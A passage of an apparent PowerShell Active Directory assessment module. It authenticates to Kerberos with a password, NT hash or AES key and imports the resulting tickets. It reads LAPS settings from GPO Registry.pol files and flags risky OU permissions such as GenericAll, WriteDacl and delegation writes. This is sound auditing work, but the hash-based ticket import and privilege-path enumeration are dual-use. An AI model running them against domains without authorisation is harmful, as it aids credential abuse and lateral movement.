	                $Result.ErrorCode = $TGTResult.ErrorCode
	                if ($TGTResult -and $TGTResult.IsNetworkError) {
	                    $Result.IsNetworkError = $true
	                    $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
	                    $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
	                }
	                throw "TGT request failed: $ErrorMsg"
	            }
	        }
	        elseif ($AES128Key) {
	            $KerbAuthParams['AES128Key'] = $AES128Key
	            $TGTResult = Invoke-KerberosAuth @KerbAuthParams
	            if (-not $TGTResult -or -not $TGTResult.Success) {
	                $ErrorMsg = if ($TGTResult.Error) { $TGTResult.Error } else { "Unknown error" }
	                $Result.ErrorCode = $TGTResult.ErrorCode
	                if ($TGTResult -and $TGTResult.IsNetworkError) {
	                    $Result.IsNetworkError = $true
	                    $Result.NetworkErrorServer = $TGTResult.NetworkErrorServer
	                    $Result.NetworkErrorPort = $TGTResult.NetworkErrorPort
	                }
	                throw "TGT request failed: $ErrorMsg"
	            }
	        }
	        else {
	            throw "No authentication material provided (Password, NTHash, AES256Key, or AES128Key required)"
	        }
	        if (-not $TGTResult.SessionKeyBytes -or $TGTResult.SessionKeyBytes.Length -eq 0) {
	            throw "TGT request succeeded but SessionKeyBytes is missing or empty (AS-REP decryption may have failed)"
	        }
	        $Result.TGTResult = $TGTResult
	        $pttParams = @{
	            TicketBytes    = $TGTResult.TicketBytes
	            SessionKey     = $TGTResult.SessionKeyBytes
	            SessionKeyType = $TGTResult.EncryptionType
	            Realm          = $TgtRealm.ToUpper()
	            ClientName     = $SamAccountName
	            ServerName     = "krbtgt"
	            ServerInstance = $TgtRealm.ToUpper()
	            AuthTime       = $TGTResult.AuthTime
	            StartTime      = $TGTResult.StartTime
	            EndTime        = $TGTResult.EndTime
	            RenewTill      = $TGTResult.RenewTill
	        }
	        if ($TGTResult.TicketFlags) { $pttParams['TicketFlags'] = $TGTResult.TicketFlags }
	        $PTTResult = Import-KerberosTicket @pttParams
	        if (-not $PTTResult -or -not $PTTResult.Success) {
	            $ErrorMsg = if ($PTTResult.Error) { $PTTResult.Error } else { "Unknown error" }
	            throw "TGT import failed: $ErrorMsg"
	        }
	        $LDAPServiceSPN = "ldap/$DCHostname"
	        $TgsKdcServer = $KdcTarget  # Always target domain KDC for TGS
	        if ($IsCrossDomain) {
	        }
	        $LDAPTicketResult = Request-AndImportServiceTicket -TGTBytes $TGTResult.TicketBytes `
	                                                           -SessionKeyBytes $TGTResult.SessionKeyBytes `
	                                                           -SessionKeyType $TGTResult.EncryptionType `
	                                                           -ServicePrincipalName $LDAPServiceSPN `
	                                                           -TargetDomain $Domain `
	                                                           -KdcServer $TgsKdcServer `
	                                                           -ClientName $SamAccountName
	        if (-not $LDAPTicketResult.Success) {
	            if ($IsCrossDomain) {
	            } else {
	                throw "LDAP service ticket failed: $($LDAPTicketResult.Error)"
	            }
	        } else {
	        }
	        $CIFSServiceSPN = "cifs/$DCHostname"
	        $CIFSTicketResult = Request-AndImportServiceTicket -TGTBytes $TGTResult.TicketBytes `
	                                                           -SessionKeyBytes $TGTResult.SessionKeyBytes `
	                                                           -SessionKeyType $TGTResult.EncryptionType `
	                                                           -ServicePrincipalName $CIFSServiceSPN `
	                                                           -TargetDomain $Domain `
	                                                           -KdcServer $TgsKdcServer `
	                                                           -ClientName $SamAccountName `
	                                                           -NonFatal
	        if (-not $CIFSTicketResult.Success) {
	        }
	        else {
	        }
	        $HostsPatched = $Script:LDAPContext -and $Script:LDAPContext['EarlyHostsPatched']
	        $UsingCustomDns = $Script:LDAPContext -and $Script:LDAPContext['DnsServer']
	        if ($UsingCustomDns -and -not $HostsPatched) {
	        }
	        $ConnParams = @{}
	        $ConnParams['Domain'] = $Domain
	        if ($Server) {
	            $ConnParams['Server'] = $Server
	        } else {
	            $ConnParams['Server'] = $DCHostname
	        }
	        if ($UseLDAPS) { $ConnParams['UseLDAPS'] = $true }
	        $ConnParams['IgnoreSSLErrors'] = $IgnoreSSLErrors
	        $Connection = Connect-LDAP @ConnParams
	        if ($Connection) {
	            if ($Connection.AuthenticatedUser -and $Connection.AuthenticatedUser -notmatch '^\[') {
	                $Result.Success = $true
	                $Result.Connection = $Connection
	            }
	            else {
	                throw "LDAP connection established but Kerberos ticket not used (non-domain-joined machine?)"
	            }
	        }
	        else {
	            if ($UsingCustomDns -and -not $HostsPatched) {
	                $DnsHint = "Kerberos tickets obtained successfully, but LDAP connection failed. " +
	                           "This is likely because Windows cannot resolve '$DCHostname' via system DNS. " +
	                           "The Kerberos ticket was issued for SPN 'ldap/$DCHostname' but Windows cannot " +
	                           "match it without hostname resolution. Use -PatchHostsFile to enable Kerberos authentication, " +
	                           "or the connection will fall back to SimpleBind."
	                throw $DnsHint
	            }
	            else {
	                throw "LDAP connection failed after ticket import (Kerberos ticket not usable on this system)"
	            }
	        }
	    }
	    catch {
	        $Result.Error = $_.Exception.Message
	    }
	    return $Result
	}
}
function Get-LAPSGPOConfig {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$false)]
	    [string]$DomainController
	)
	begin {
	}
	process {
	    if (-not $Script:LdapConnection) {
	        Show-NoSessionError -Context "Get-LAPSGPOConfig"
	        return $null
	    }
	    try {
	        $GPOFilter = "(objectClass=groupPolicyContainer)"
	        $GPOs = Invoke-LDAPSearch -Filter $GPOFilter -Properties @("displayName", "gPCFileSysPath", "cn")
	        $LAPSGPOSettings = @{}
	        if (-not $GPOs -or $GPOs.Count -eq 0) {
	            return $LAPSGPOSettings
	        }
	        $gpoGuidToName = @{}
	        $sysvolBasePath = $null
	        foreach ($GPO in $GPOs) {
	            $gpoName = $GPO.displayName
	            $gpoPath = $GPO.gPCFileSysPath
	            $gpoCN = $GPO.cn
	            if ($gpoCN) {
	                $gpoGuidToName[$gpoCN.ToUpper()] = $gpoName
	            }
	            if (-not $sysvolBasePath -and $gpoPath) {
	                if ($gpoPath -match '^(\\\\[^\\]+\\[^\\]+\\[^\\]+\\Policies)') {
	                    $sysvolBasePath = $Matches[1]
	                }
	            }
	        }
	        if (-not $sysvolBasePath) {
	            return $LAPSGPOSettings
	        }
	        $resolvedSmbIP = $null
	        if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer'] -and $Script:LDAPContext['ServerIP']) {
	            $resolvedSmbIP = $Script:LDAPContext['ServerIP']
	            if ($sysvolBasePath -match '^\\\\([^\\]+)\\') {
	                $uncHost = $Matches[1]
	                $ipTest = $null
	                if (-not [System.Net.IPAddress]::TryParse($uncHost, [ref]$ipTest)) {
	                    $sysvolBasePath = $sysvolBasePath -replace "^\\\\[^\\]+\\", "\\$resolvedSmbIP\"
	                }
	            }
	        }
	        $Script:lapsGPOResults = @{}
	        Invoke-SMBAccess -Description "Scanning GPO Registry.pol for LAPS settings" -ScriptBlock {
	            try {
	                $polFiles = Get-ChildItem -Path $sysvolBasePath -Filter "Registry.pol" -Recurse -ErrorAction SilentlyContinue
	                if (-not $polFiles -or $polFiles.Count -eq 0) {
	                    return
	                }
	                foreach ($polFile in $polFiles) {
	                    if ($polFile.FullName -match '\\Policies\\(\{[^}]+\})\\') {
	                        $gpoGuid = $Matches[1].ToUpper()
	                        $gpoName = $gpoGuidToName[$gpoGuid]
	                        if (-not $gpoName) {
	                            continue
	                        }
	                        try {
	                            $AdminAccountName = Parse-RegistryPolForLAPS -PolFilePath $polFile.FullName
	                            if ($AdminAccountName) {
	                                $Script:lapsGPOResults[$gpoName] = $AdminAccountName
	                            }
	                        } catch {
	                        }
	                    }
	                }
	            } catch {
	            }
	        }
	        $LAPSGPOSettings = $Script:lapsGPOResults
	        return $LAPSGPOSettings
	    } catch {
	        return @{}
	    }
	}
	end {
	}
}
function Parse-RegistryPolForLAPS {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$PolFilePath
	)
	try {
	    $FileBytes = [System.IO.File]::ReadAllBytes($PolFilePath)
	    if ($FileBytes.Length -lt 8) {
	        return $null
	    }
	    if ([System.Text.Encoding]::ASCII.GetString($FileBytes[0..3]) -ne "PReg") {
	        return $null
	    }
	    $FileString = [System.Text.Encoding]::Unicode.GetString($FileBytes)
	    if ($FileString -match 'Software\\Policies\\Microsoft Services\\AdmPwd.*?AdminAccountName.*?\x00([^\x00]+)\x00') {
	        $AdminAccountName = $Matches[1]
	        return $AdminAccountName
	    }
	    if ($FileString -match 'AdmPwd.*?AdminAccountName') {
	        $StartIndex = $FileString.IndexOf("AdminAccountName")
	        if ($StartIndex -gt 0) {
	            $SubString = $FileString.Substring($StartIndex)
	            $SemicolonCount = 0
	            $DataStart = -1
	            for ($i = 0; $i -lt $SubString.Length; $i++) {
	                if ($SubString[$i] -eq ';') {
	                    $SemicolonCount++
	                    if ($SemicolonCount -eq 3) {
	                        $DataStart = $i + 2  # Skip semicolon and next byte
	                        break
	                    }
	                }
	            }
	            if ($DataStart -gt 0 -and $DataStart -lt $SubString.Length) {
	                $EndIndex = $SubString.IndexOf(']', $DataStart)
	                if ($EndIndex -eq -1) { $EndIndex = $SubString.IndexOf([char]0x5D, $DataStart) }
	                if ($EndIndex -eq -1) { $EndIndex = $SubString.Length }
	                $ValueString = $SubString.Substring($DataStart, $EndIndex - $DataStart)
	                $ValueString = $ValueString -replace '[\x00-\x1F\x5D]', ''
	                $ValueString = $ValueString.Trim()
	                if ($ValueString.Length -gt 0 -and $ValueString.Length -lt 50) {
	                    return $ValueString
	                }
	            }
	        }
	    }
	    return $null
	} catch {
	    return $null
	}
}
function Get-ACEInheritanceSource {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$DistinguishedName,
	    [Parameter(Mandatory=$true)]
	    $ACE
	)
	try {
	    $domainDN = $Script:LDAPContext.DomainDN
	    $currentDN = $DistinguishedName
	    $parents = @()
	    while ($currentDN -match '^[^,]+,(.+)$') {
	        $parentDN = $Matches[1]
	        $parents += $parentDN
	        $currentDN = $parentDN
	        if ($parentDN -eq $domainDN) {
	            break
	        }
	    }
	    $aceIdentitySID = $ACE.IdentityReference.Value
	    if (-not $Script:InheritanceACLCache) {
	        $Script:InheritanceACLCache = @{}
	    }
	    foreach ($parentDN in $parents) {
	        try {
	            $cacheKey = $parentDN.ToLowerInvariant()
	            $parentAccessRules = $null
	            if ($Script:InheritanceACLCache.ContainsKey($cacheKey)) {
	                $parentAccessRules = $Script:InheritanceACLCache[$cacheKey]
	            } else {
	                $parentResult = @(Invoke-LDAPSearch -Filter "(objectClass=*)" -SearchBase $parentDN -Scope Base -Properties 'nTSecurityDescriptor' -Raw)[0]
	                if ($parentResult -and $parentResult.nTSecurityDescriptor) {
	                    $parentSdParsed = ConvertTo-AccessRules -SecurityDescriptorBytes $parentResult.nTSecurityDescriptor
	                    $parentAccessRules = if ($parentSdParsed) { $parentSdParsed.AccessRules } else { @() }
	                } else {
	                    $parentAccessRules = @()
	                }
	                $Script:InheritanceACLCache[$cacheKey] = $parentAccessRules
	            }
	            if (-not $parentAccessRules -or @($parentAccessRules).Count -eq 0) {
	                continue
	            }
	            foreach ($parentACE in $parentAccessRules) {
	                if ($parentACE.IsInherited) { continue }
	                if ($parentACE.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) { continue }
	                if ($parentACE.IdentityReference.Value -ne $aceIdentitySID) { continue }
	                $inheritFlags = $parentACE.InheritanceFlags
	                $canInherit = ($inheritFlags -band [System.Security.AccessControl.InheritanceFlags]::ContainerInherit) -or
	                              ($inheritFlags -band [System.Security.AccessControl.InheritanceFlags]::ObjectInherit)
	                if (-not $canInherit) { continue }
	                $aceObjType = $ACE.ObjectType
	                $parentObjType = $parentACE.ObjectType
	                if ($aceObjType -and $aceObjType -ne [GUID]::Empty -and
	                    $parentObjType -and $parentObjType -ne [GUID]::Empty) {
	                    if ($aceObjType -ne $parentObjType) { continue }
	                }
	                if ($parentDN -eq $domainDN) {
	                    return "Domain Root ($domainDN)"
	                } else {
	                    $rdnMatch = $parentDN -match '^([^=]+)=([^,]+)'
	                    if ($rdnMatch) {
	                        $rdnType = $Matches[1]
	                        $rdnValue = $Matches[2]
	                        return "$rdnType=$rdnValue ($parentDN)"
	                    }
	                    return $parentDN
	                }
	            }
	        } catch {
	            continue
	        }
	    }
	    if ($parents -contains $domainDN) {
	        return "Domain Root ($domainDN)"
	    }
	    return "Inherited"
	} catch {
	    return "Inherited"
	}
}
function Get-OUPermissions {
	[CmdletBinding()]
	param(
	    [Parameter(Mandatory=$true)]
	    [string]$DistinguishedName,
	    [Parameter(Mandatory=$false)]
	    [ValidateSet(
	        'All',
	        'GenericAll',
	        'GenericWrite',
	        'WriteDacl',
	        'WriteOwner',
	        'PasswordReset',
	        'AccountControl',
	        'GroupMembership',
	        'SPNModification',
	        'DNSHostName',
	        'ScriptPath',
	        'Delegation',
	        'LAPS',
	        'ObjectCreation',
	        'GPOLinking'
	    )]
	    [string[]]$CheckType = @('All'),
	    [Parameter(Mandatory=$false)]
	    [switch]$ExcludeInherited
	)
	begin {
	    $PropertyGUIDs = $Script:PropertyGUIDs
	    $SchemaClassGUIDs = $Script:SchemaClassGUIDs
	    $isFullScan = $CheckType -contains 'All'
	    if ($isFullScan) {
	        $CheckType = @(
	            'GenericAll', 'GenericWrite', 'WriteDacl', 'WriteOwner',
	            'PasswordReset', 'AccountControl', 'GroupMembership',
	            'SPNModification', 'DNSHostName', 'ScriptPath', 'Delegation', 'LAPS',
	            'ObjectCreation', 'GPOLinking'
	        )
	    }
	}
	process {
	    if (-not $Script:LdapConnection -or -not $Script:LDAPContext) {
	        return $null
	    }
	    try {
	        if (-not $Script:OUPermissionsCache) {
	            $Script:OUPermissionsCache = @{}
	        }
	        $cacheKey = $DistinguishedName.ToLowerInvariant()
	        if ($Script:OUPermissionsCache.ContainsKey($cacheKey)) {
	            $cached = $Script:OUPermissionsCache[$cacheKey]
	            $filteredFindings = @($cached.Findings | Where-Object { $_.CheckType -in $CheckType })
	            return [PSCustomObject]@{
	                OU       = $DistinguishedName
	                Findings = $filteredFindings
	            }
	        }
	        $ouResult = @(Invoke-LDAPSearch -Filter "(objectClass=*)" -SearchBase $DistinguishedName -Scope Base -Properties 'nTSecurityDescriptor' -Raw)[0]
	        if (-not $ouResult -or -not $ouResult.nTSecurityDescriptor) {
	            return $null
	        }
	        $sdParsed = ConvertTo-AccessRules -SecurityDescriptorBytes $ouResult.nTSecurityDescriptor
	        if (-not $sdParsed) {
	            return $null
	        }
	        $AccessRules = $sdParsed.AccessRules
	        $Findings = @()
	        foreach ($ACE in $AccessRules) {
	            if ($ACE.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) {
	                continue
	            }
	            if ($ExcludeInherited -and $ACE.IsInherited) {
	                continue
	            }
	            $TrusteeSID = $ACE.IdentityReference.Value
	            $TrusteeName = ConvertFrom-SID -SID $TrusteeSID
	            if (-not $TrusteeName) {
	                $TrusteeName = $TrusteeSID
	            }
	            if ([string]::IsNullOrEmpty($TrusteeSID)) {
	                continue
	            }
	            $expectedCheck = Test-IsExpectedACLIdentity -SID $TrusteeSID -Context 'OU'
	            if ($expectedCheck.Skip) {
	                continue
	            }
	            $skipAllPropertiesOnly = $expectedCheck.SkipAllPropertiesOnly
	            $nameOnly = $TrusteeName
	            if ($TrusteeName -match '^[^\\]+\\(.+)$') {
	                $nameOnly = $Matches[1]
	            }
	            $identityObject = [PSCustomObject]@{
	                objectSid = $TrusteeSID
	                sAMAccountName = $nameOnly
	            }
	            $IsPrivileged = (Test-IsPrivileged -Identity $identityObject).IsPrivileged
	            $InheritedFrom = $null
	            if ($ACE.IsInherited) {
	                $InheritedFrom = Get-ACEInheritanceSource -DistinguishedName $DistinguishedName -ACE $ACE
	            }
	            $objectType = $ACE.ObjectType
	            $inheritedObjectType = $ACE.InheritedObjectType
	            $HasWriteProperty = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty
	            $IsAllProperties = ($objectType -eq [GUID]::Empty) -or (-not $objectType)
	            $IsAllObjectTypes = (-not $inheritedObjectType -or $inheritedObjectType -eq [GUID]::Empty)
	            $AppliesToUsers = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['user'])
	            $AppliesToComputers = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['computer'])
	            $AppliesToGroups = $IsAllObjectTypes -or ($inheritedObjectType -eq $SchemaClassGUIDs['group'])
	            if ($HasWriteProperty -and $IsAllProperties -and ($CheckType -contains 'AccountControl' -or
	                $CheckType -contains 'GroupMembership' -or $CheckType -contains 'SPNModification' -or
	                $CheckType -contains 'ScriptPath' -or $CheckType -contains 'Delegation' -or
	                $CheckType -contains 'GPOLinking')) {
	                if (-not $skipAllPropertiesOnly) {
	                    $scopeInfo = if ($IsAllObjectTypes) {
	                        ""
	                    } else {
	                        $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
	                        if ($targetClass) { " on $targetClass objects" } else { "" }
	                    }
	                    $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "WritePropertyAll"
	                        Right         = "WriteProperty (All Properties)$scopeInfo"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'GenericAll') {
	                $GenericAllValue = [int][System.DirectoryServices.ActiveDirectoryRights]::GenericAll
	                $RightsValue = [int]$ACE.ActiveDirectoryRights
	                $HasFullGenericAll = (($RightsValue -band $GenericAllValue) -eq $GenericAllValue) -and $IsAllProperties
	                if ($HasFullGenericAll) {
	                    $scopeInfo = if ($IsAllObjectTypes) {
	                        ""  # No suffix for all objects
	                    } else {
	                        $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
	                        if ($targetClass) { " on $targetClass objects" } else { "" }
	                    }
	                    $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "GenericAll"
	                        Right         = "GenericAll (Full Control)$scopeInfo"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'GenericWrite') {
	                $GenericWriteValue = [int][System.DirectoryServices.ActiveDirectoryRights]::GenericWrite
	                $RightsValue = [int]$ACE.ActiveDirectoryRights
	                $HasGenericWrite = (($RightsValue -band $GenericWriteValue) -eq $GenericWriteValue) -and $IsAllProperties
	                if ($HasGenericWrite) {
	                    $scopeInfo = if ($IsAllObjectTypes) {
	                        ""
	                    } else {
	                        $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
	                        if ($targetClass) { " on $targetClass objects" } else { "" }
	                    }
	                    $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "GenericWrite"
	                        Right         = "GenericWrite$scopeInfo"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'WriteDacl') {
	                $HasWriteDacl = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl
	                if ($HasWriteDacl) {
	                    $scopeInfo = if ($IsAllObjectTypes) {
	                        ""
	                    } else {
	                        $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
	                        if ($targetClass) { " on $targetClass objects" } else { "" }
	                    }
	                    $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "WriteDacl"
	                        Right         = "WriteDacl (Modify Permissions)$scopeInfo"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'WriteOwner') {
	                $HasWriteOwner = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteOwner
	                if ($HasWriteOwner) {
	                    $scopeInfo = if ($IsAllObjectTypes) {
	                        ""
	                    } else {
	                        $targetClass = Get-SchemaClassName -GUID $inheritedObjectType
	                        if ($targetClass) { " on $targetClass objects" } else { "" }
	                    }
	                    $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                    $Findings += [PSCustomObject]@{
	                        CheckType     = "WriteOwner"
	                        Right         = "WriteOwner (Take Ownership)$scopeInfo"
	                        Principal     = $TrusteeName
	                        SID           = $TrusteeSID
	                        Severity      = $Severity
	                        InheritedFrom = $InheritedFrom
	                    }
	                }
	            }
	            if ($CheckType -contains 'PasswordReset') {
	                $HasExtendedRight = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
	                if ($HasExtendedRight -and $AppliesToUsers) {
	                    $passwordResetGUID = Get-ExtendedRightGUID -Name 'User-Force-Change-Password'
	                    if ($ACE.ObjectType -eq $passwordResetGUID -or $ACE.ObjectType -eq [GUID]::Empty) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "PasswordReset"
	                            Right         = "Reset Password (Extended Right)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'AccountControl') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['userAccountControl']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "AccountControl"
	                            Right         = "WriteProperty (userAccountControl)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                    elseif ($ACE.ObjectType -eq $Script:PropertySetGUIDs['User-Account-Restrictions']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Critical" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "AccountControl"
	                            Right         = "WriteProperty (User-Account-Restrictions)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'GroupMembership') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToGroups) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['member']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "GroupMembership"
	                            Right         = "WriteProperty (member)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'SPNModification') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['servicePrincipalName']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "SPNModification"
	                            Right         = "WriteProperty (servicePrincipalName)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                    elseif ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-SPN']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "SPNModification"
	                            Right         = "WriteProperty (servicePrincipalName)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	                $HasSelf = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::Self
	                if ($HasSelf -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
	                    if ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-SPN']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "SPNModification"
	                            Right         = "Self (Validated-SPN)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'DNSHostName') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToComputers) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['dNSHostName']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "DNSHostName"
	                            Right         = "WriteProperty (dNSHostName)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                    elseif ($ACE.ObjectType -eq $Script:PropertySetGUIDs['DNS-Host-Name-Attributes']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "DNSHostName"
	                            Right         = "WriteProperty (DNS-Host-Name-Attributes)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                    elseif ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-DNS-Host-Name']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "DNSHostName"
	                            Right         = "WriteProperty (dNSHostName)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	                $HasSelf = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::Self
	                if ($HasSelf -and -not $IsAllProperties -and $AppliesToComputers) {
	                    if ($ACE.ObjectType -eq $Script:ValidatedWriteGUIDs['Validated-DNS-Host-Name']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "DNSHostName"
	                            Right         = "Self (Validated-DNS-Host-Name)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'ScriptPath') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and $AppliesToUsers) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['scriptPath']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "ScriptPath"
	                            Right         = "WriteProperty (scriptPath)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'Delegation') {
	                if ($HasWriteProperty -and -not $IsAllProperties -and ($AppliesToUsers -or $AppliesToComputers)) {
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['msDS-AllowedToDelegateTo']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "Delegation"
	                            Right         = "WriteProperty (msDS-AllowedToDelegateTo)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                    if ($ACE.ObjectType -eq $PropertyGUIDs['msDS-AllowedToActOnBehalfOfOtherIdentity']) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "High" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "Delegation"
	                            Right         = "WriteProperty (msDS-AllowedToActOnBehalfOfOtherIdentity)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                    }
	                }
	            }
	            if ($CheckType -contains 'LAPS') {
	                $HasReadProperty = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ReadProperty
	                $HasGenericAll = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
	                $HasExtendedRight = $ACE.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
	                if (($HasReadProperty -or $HasGenericAll -or $HasExtendedRight) -and $AppliesToComputers) {
	                    $lapsIsAllProperties = $IsAllProperties
	                    $lapsPropertyFound = $false
	                    $legacyLAPSMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['ms-Mcs-AdmPwd'].Guid)
	                    if ($legacyLAPSMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
	                        $Findings += [PSCustomObject]@{
	                            CheckType     = "LAPS"
	                            Right         = "ReadProperty (ms-Mcs-AdmPwd - Legacy LAPS)"
	                            Principal     = $TrusteeName
	                            SID           = $TrusteeSID
	                            Severity      = $Severity
	                            InheritedFrom = $InheritedFrom
	                        }
	                        $lapsPropertyFound = $true
	                    }
	                    $encPwdMatch = ($ACE.ObjectType -and $ACE.ObjectType.Guid -eq $PropertyGUIDs['msLAPS-EncryptedPassword'].Guid)
	                    if ($encPwdMatch) {
	                        $Severity = if ($IsPrivileged) { "Info" } else { "Medium" }
